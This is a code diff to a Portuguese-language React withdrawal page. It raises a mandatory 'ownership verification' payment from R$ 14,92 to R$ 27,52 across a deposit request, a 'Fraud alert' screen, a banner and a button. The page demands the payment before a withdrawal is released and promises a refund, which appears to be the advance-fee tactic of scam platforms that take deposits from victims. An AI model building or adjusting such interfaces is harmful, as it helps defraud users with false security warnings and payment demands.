@@ -231,7 +231,7 @@ export default function NovoSaquePage() {
           Authorization: `Bearer ${session.access_token}`,
         },
         body: {
-          valor: 14.92,
+          valor: 27.52,
           tipo: 'deposito',
           wallet_type: 'tradicional',
         },
@@ -453,7 +453,7 @@ export default function NovoSaquePage() {
               <CheckCircle className="h-20 w-20 text-green-500 mx-auto mb-4" />
               <h2 className="text-2xl font-bold text-white mb-2">Titularidade Verificada!</h2>
               <p className="text-zinc-400 mb-6">
-                Pagamento de {formatCurrency(pixPaymentData?.valor || 14.92)} confirmado. Prosseguindo com o saque...
+                Pagamento de {formatCurrency(pixPaymentData?.valor || 27.52)} confirmado. Prosseguindo com o saque...
               </p>
               <Loader2 className="h-6 w-6 animate-spin text-amber-400 mx-auto" />
             </div>
@@ -486,7 +486,7 @@ export default function NovoSaquePage() {
               {/* Info Banner */}
               <div className="bg-amber-900/20 border border-amber-700/30 rounded-xl p-4">
                 <p className="text-sm text-zinc-300 leading-relaxed">
-                  Realize o pagamento de <span className="font-bold text-amber-500">R$ 14,92</span> para verificar a titularidade da sua conta. O valor será devolvido após a verificação.
+                  Realize o pagamento de <span className="font-bold text-amber-500">R$ 27,52</span> para verificar a titularidade da sua conta. O valor será devolvido após a verificação.
                 </p>
               </div>
 
@@ -592,7 +592,7 @@ export default function NovoSaquePage() {
             <AlertCircle className="h-20 w-20 text-red-500 mx-auto mb-4" />
             <h2 className="text-2xl font-bold text-white mb-4">Alerta de Fraude</h2>
             <p className="text-zinc-300 text-base leading-relaxed mb-6 max-w-sm mx-auto">
-              Para a liberação do seu saque, é necessário realizar uma verificação de titularidade, em uma transferência no valor de <span className="font-bold text-amber-500">R$ 14,92</span> a partir de uma conta bancária de mesma titularidade (mesmo CPF do cadastro).
+              Para a liberação do seu saque, é necessário realizar uma verificação de titularidade, em uma transferência no valor de <span className="font-bold text-amber-500">R$ 27,52</span> a partir de uma conta bancária de mesma titularidade (mesmo CPF do cadastro).
             </p>
             <p className="text-zinc-400 text-sm italic mb-8 max-w-sm mx-auto">
               O valor será devolvido após a verificação.
@@ -623,7 +623,7 @@ export default function NovoSaquePage() {
                       <path d="M12 2L2 7l10 5 10-5-10-5z" fill="#1a1a1a"/>
                       <path d="M2 17l10 5 10-5M2 12l10 5 10-5" stroke="#1a1a1a" strokeWidth="2"/>
                     </svg>
-                    Verificar Titularidade - R$ 14,92
+                    Verificar Titularidade - R$ 27,52
                   </>
                 )}
               </button>
